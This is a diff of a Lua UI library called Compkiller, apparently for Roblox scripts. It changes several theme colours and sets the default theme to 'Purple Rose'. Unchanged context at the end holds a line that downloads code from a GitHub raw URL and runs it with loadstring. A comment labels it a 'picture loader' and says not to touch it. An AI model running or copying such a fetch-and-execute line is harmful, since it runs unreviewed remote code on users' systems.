@@ -6188,11 +6188,11 @@ function Compkiller:SetTheme(name)
 			["BlockColor"] = Color3.new(0.0948428, 0.0576457, 0.165517),
 			["DropColor"] = Color3.new(0.131034, 0, 0.0813317),
 			["HighStrokeColor"] = Color3.new(0.136259, 0.101237, 0.296552),
-			["Highlight"] = Color3.new(0.992157, 0.0666667, 0.33474),
-			["LineColor"] = Color3.new(0.20872, 0.137408, 0.372414),
+			["Highlight"] = Color3.new(0.992157, 0.0666667, 0.33474), -- for outline
+			["LineColor"] = Color3.new(0.992157, 0.0666667, 0.33474),
 			["MouseEnter"] = Color3.new(0.365517, 0, 0.120999),
 			["Risky"] = Color3.new(1, 0.6086, 0.152941),
-			["StrokeColor"] = Color3.new(0.148499, 0.137836, 0.248276),
+			["StrokeColor"] = Color3.new(0.992157, 0.0666667, 0.33474),
 			["SwitchColor"] = Color3.new(1, 1, 1),
 			["Toggle"] = Color3.new(0.835294, 0.054902, 0.248654)
 		}
@@ -10640,7 +10640,7 @@ Compkiller.NilFolder.Name = "Nil-Instances";
 EXTENSION DO NOT TOUCH, ITS FOR THE PICTURE LOADER
 --]]
 
-Compkiller:SetTheme("Default")
+Compkiller:SetTheme("Purple Rose")
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/f345bb35a3e4323c3fb6ad2f8b7e0122f701f85/icek/refs/heads/main/picture"))()
 
